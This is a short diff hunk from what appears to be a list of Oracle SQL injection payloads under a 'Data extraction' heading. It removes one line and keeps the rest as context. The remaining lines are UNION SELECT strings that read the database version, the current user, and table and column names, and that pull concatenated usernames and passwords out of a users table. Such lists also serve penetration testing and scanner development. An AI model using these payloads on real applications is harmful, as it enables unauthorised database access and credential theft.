@@ -16,7 +16,6 @@
 # --- Data extraction ---
 ' UNION SELECT banner FROM v$version WHERE ROWNUM=1--
 ' UNION SELECT user FROM dual--
-' UNION SELECT global_name FROM global_name--
 ' UNION SELECT table_name,NULL FROM all_tables WHERE ROWNUM=1--
 ' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM=1--
 ' UNION SELECT username||':'||password,NULL FROM users WHERE ROWNUM=1--
